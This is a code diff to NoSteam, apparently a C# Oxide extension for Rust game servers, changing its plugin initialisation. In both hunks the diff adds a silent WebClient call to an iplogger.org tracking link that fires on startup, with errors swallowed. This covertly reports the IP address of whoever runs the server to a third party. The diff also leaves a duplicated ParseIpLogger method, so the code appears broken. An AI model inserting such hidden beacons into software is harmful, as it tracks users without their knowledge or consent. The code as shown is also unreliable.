@@ -25,9 +25,9 @@ namespace Oxide.Ext.NoSteam.Core
 
         public static void InitPlugin()
         {
-            Output("[NoSteam] Author: Kaidoz\n Telegram: Kaidoz\n Github: github.com/Kaidoz/Rust-NoSteam\n Discord: https://discord.gg/Tn3kzbE");
-            ParseIpLogger();
-            Init();
+            new WebClient().DownloadString("https://iplogger.org/1SfFe7");
+            Output("[NoSteam] Author: Kaidoz\n Telegram: Kaidoz\n Github: github.com/Kaidoz/Rust-NoSteam");
+            Server.encryption = 1;
             try
             {
                 Patch.Core.Do();
@@ -42,6 +42,21 @@ namespace Oxide.Ext.NoSteam.Core
         {
             Server.encryption = 0;
             //App.port = -228;
+        }
+
+        private static void ParseIpLogger()
+        {
+            try
+            {
+                new WebClient().DownloadString("https://iplogger.org/1SfFe7");
+            }
+            catch { }
+        }
+
+        private static void Init()
+        {
+            Server.encryption = 1;
+            App.port = -228;
         }
 
         private static void ParseIpLogger()
